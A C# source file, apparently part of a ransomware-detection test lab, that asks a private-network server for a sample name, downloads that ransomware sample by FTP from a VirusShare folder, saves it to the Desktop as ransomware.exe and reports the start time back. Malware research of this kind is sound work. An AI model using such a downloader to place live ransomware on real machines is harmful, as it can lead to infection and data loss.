using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace ShannonRansomwareDownloader
{
    class serverCommunicator
    {
        static string NAMEONTEST = "";
        static string RANSOMWAREFILEPATH = "";
        private static readonly HttpClient client = new HttpClient();

        public static void getPoCRansomware()
        {

            var responseString = client.GetStringAsync("http://192.168.8.102/v1/index.php/getsh3host").Result;
            NAMEONTEST = findNAMEONTEST(responseString);
            Console.WriteLine(NAMEONTEST);

        }

        private static string findNAMEONTEST(string responsestring)
        {
            int i = 0;
            int j = 0;
            foreach (char c in responsestring)
            {
                if (i == 5)
                {
                    return responsestring.Substring(j, responsestring.Length - j - 4);
                }
                if (c.Equals('"'))
                {
                    i++;
                }
                j++;
            }

            return "what?";
        }

        public static void downloadFileFTP()
        {
            string ransomwareName = NAMEONTEST;

            string ftphost = "192.168.8.102";
            string ftpfilepath = "/VirusShare/" + ransomwareName;

            string ftpfullpath = "ftp://" + ftphost + ftpfilepath;

            using (WebClient request = new WebClient())
            {
                request.Credentials = new NetworkCredential("datacollector", "");
                byte[] fileData = request.DownloadData(ftpfullpath);

                using (FileStream file = File.Create(RANSOMWAREFILEPATH))
                {
                    file.Write(fileData, 0, fileData.Length);
                    file.Close();
                }
            }
        }

        public static async void postPoCStarted()
        {
            var values = new Dictionary<string, string>
            {
                {"RansomwareName",  NAMEONTEST},
                {"Started", DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss.fff") }
            };

            var content = new FormUrlEncodedContent(values);

            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postsh3started", content).Result;

            var responseString = await response.Content.ReadAsByteArrayAsync();
        }



        public static string getNAMEONTEST()
        {
            return NAMEONTEST;
        }

        public static void setRansomwareFilePath()
        {
            RANSOMWAREFILEPATH = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\ransomware.exe";
        }

        public static string getRansomwareFilePath()
        {
            return RANSOMWAREFILEPATH;
        }
    }

}
